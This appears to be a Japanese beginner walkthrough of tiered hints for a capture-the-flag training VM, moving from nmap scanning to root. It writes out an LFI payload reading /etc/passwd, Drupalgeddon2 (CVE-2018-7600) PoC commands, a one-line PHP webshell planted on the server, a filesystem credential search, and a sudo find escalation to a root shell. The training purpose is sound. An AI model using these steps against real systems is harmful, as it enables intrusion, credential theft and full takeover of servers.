# WALKTHROUGH (Beginner) — 段階的ヒント集

> **使い方**: 詰まったら、上から1個ずつ `<details>` を開く。最初から全部開いちゃダメ、自分で考える時間がいちばん勉強になる。

各ステージは:
- **状況** = いま何ができていて何が分からない状態
- **ヒント Lv1〜Lv3** = 弱→中→強。Lv3 はほぼ答え

---

## STAGE 1: 偵察 (Reconnaissance)

**状況**: VMのIPは分かった。さて何をする?

<details>
<summary>Hint Lv1 — どこから始める?</summary>

「サービスの一覧を取る」ところから。Linuxサーバーにポートスキャンを打つのは挨拶みたいなもの。
</details>

<details>
<summary>Hint Lv2 — どのコマンド?</summary>

```
nmap -p- -sV -sC <target-ip>
```
- `-p-` 全ポートスキャン (デフォルトは1000ポートだけ)
- `-sV` バージョン特定
- `-sC` 標準スクリプト実行
</details>

<details>
<summary>Hint Lv3 — 何が見えるはず?</summary>

ポート2つ。一つはSSH (22)、もう一つは Web サーバー (80/HTTP)。Webから攻めるのが定石です。
</details>

---

## STAGE 2: メインサイト調査

**状況**: ブラウザで `http://<target>/` を開いた。古い感じの企業サイトが出る。次は?

<details>
<summary>Hint Lv1 — 何を観察する?</summary>

ナビゲーションをクリックしながら、**URLバー** を凝視。何かパターンに気づくはず。
</details>

<details>
<summary>Hint Lv2 — URLパラメータの脆弱性</summary>

URLに `?page=pages/about.php` のような形が見える? これは「サーバー側でファイルを読み込む」処理が入っている可能性大。**任意のパスを指定したらどうなる?**
</details>

<details>
<summary>Hint Lv3 — 試すべきURL</summary>

```
http://<target>/?page=/etc/passwd
```
これでサーバーの /etc/passwd が表示されたら、**LFI (Local File Inclusion)** 確定。
</details>

---

## STAGE 3: LFI を活用して隠しパスを見つける

**状況**: LFI が動くことは分かった。でも、これだけじゃどこから次に行けばいい?

<details>
<summary>Hint Lv1 — 何を読む?</summary>

サーバーには「Webルートの上のディレクトリ」がある。`/var/www/` の中身に何があるか想像してみて。
</details>

<details>
<summary>Hint Lv2 — 怪しい候補</summary>

管理者は時々、Webルートの **すぐ外** に「メモ書き」「設定バックアップ」を置きがち。`maintenance.txt` とか `notes.txt` とかありそうな名前を試してみる。
</details>

<details>
<summary>Hint Lv3 — ピンポイント</summary>

```
http://<target>/?page=/var/www/maintenance.txt
```
ここに重要な情報(隠しパス + CMSバージョン)が書かれている。読み取って次へ。
</details>

---

## STAGE 4: 隠しブログとCVE発見

**状況**: メンテファイルから `/blog/` の存在と CMS バージョン情報を得た。

<details>
<summary>Hint Lv1 — 確認すべきこと</summary>

`http://<target>/blog/` をブラウザで開く。CMS のロゴが見える。これは何のCMS?ヒント:雫 (drop) 形のロゴ。
</details>

<details>
<summary>Hint Lv2 — バージョンを特定</summary>

ほとんどの古い CMS は `CHANGELOG.txt` をWebルートに置いたまま。
```
http://<target>/blog/CHANGELOG.txt
```
冒頭にバージョンが書いてある。
</details>

<details>
<summary>Hint Lv3 — その CVE は?</summary>

**Drupal 7.57** + 2018年の重大脆弱性 = **CVE-2018-7600** (通称 **Drupalgeddon2**)。未認証でRCE取れる超強力な脆弱性。GitHubで「Drupalgeddon2 PoC」を検索。
</details>

---

## STAGE 5: Drupalgeddon2 でRCE

**状況**: PoCをGitHubで見つけた。実行方法が分からない。

<details>
<summary>Hint Lv1 — PoCの選び方</summary>

GitHub で `drupalgeddon2` を検索すると Python や bash の PoC が複数出る。**Python版** が読みやすくておすすめ。`pimps/CVE-2018-7600` あたりが定番。
</details>

<details>
<summary>Hint Lv2 — 実行</summary>

```bash
git clone https://github.com/pimps/CVE-2018-7600
cd CVE-2018-7600
python3 drupalgeddon2.py -h
python3 drupalgeddon2.py -t http://<target>/blog/ -c id
```
`uid=33(www-data)` が返ってきたらRCE成功。
</details>

<details>
<summary>Hint Lv3 — Webshell化</summary>

毎回PoCを叩くのはダルいので、最初の一発で webshell を仕込む:
```
python3 drupalgeddon2.py -t http://<target>/blog/ -c "echo '<?php system(\$_GET[c]); ?>' > /var/www/html/blog/sites/default/files/sh.php"
```
あとは `http://<target>/blog/sites/default/files/sh.php?c=id` でコマンド実行。
</details>

---

## STAGE 6: FLAG 1 (web)

**状況**: webshell or RCE が手に入った。1個目のフラグはどこ?

<details>
<summary>Hint Lv1</summary>
Webサーバーのドキュメントルート周辺を `ls -la` で覗いて回る。
</details>

<details>
<summary>Hint Lv2</summary>
`/var/www/` 直下に「.」で始まる隠しファイルがある。
</details>

---

## STAGE 7: 横展開 (www-data → yamamoto)

**状況**: Webシェルを取れた。でも www-data は権限弱い。次の手は?

<details>
<summary>Hint Lv1 — どこを探す?</summary>

サーバー上のテキストファイルで「password」「credential」「cred」などの単語を含むものを探す。
</details>

<details>
<summary>Hint Lv2 — コマンド例</summary>

```
find / -type f -readable 2>/dev/null | xargs grep -l -i "password\|credential" 2>/dev/null | head -20
```
または
```
ls -la /var/backups/
ls -la /opt/
```
</details>

<details>
<summary>Hint Lv3</summary>

`/var/backups/yamamoto-personal-notes.txt` が世界読み取り可能になっている。Yamamoto-san のパスワード使い回し癖が記録されている。
</details>

---

## STAGE 8: SSH ログイン → FLAG 2

**状況**: yamamoto のパスワードを入手した。

```bash
ssh yamamoto@<target>
# password: (Stage 7で見つけたやつ)
cat user.txt
```
2個目のフラグゲット。

---

## STAGE 9: 権限昇格 → root → FLAG 3

**状況**: yamamoto としてシェルが取れた。最後の壁は root。

<details>
<summary>Hint Lv1 — 最初に何を確認?</summary>

定番中の定番:
```
sudo -l
```
このユーザーが「パスワードなしで実行できるコマンド」が見える。
</details>

<details>
<summary>Hint Lv2 — GTFOBins</summary>

NOPASSWD で許可されているコマンド名を https://gtfobins.github.io/ で検索。`Sudo` のセクションを見れば、root権限でシェルを開く方法が書いてある。
</details>

<details>
<summary>Hint Lv3 — 答え</summary>

```bash
sudo find . -exec /bin/sh \; -quit
# または
sudo find /root/root.txt -exec cat {} \;
```
3個目のフラグゲット、CTF完全制覇。
</details>

---

## 終わったあとに

- 自分のWriteup を書く(Markdown で「やったこと一覧」をまとめるだけでもOK)
- 同じCVEの別の攻略法を調べる(例: Metasploit `exploit/unix/webapp/drupal_drupalgeddon2`)
- このVMで他に「もう一つの解き方」がないか探してみる(LFI で別ファイル読んでみたり)
- 次は **TryHackMe** や **HackTheBox** の "Easy" マシンに挑戦
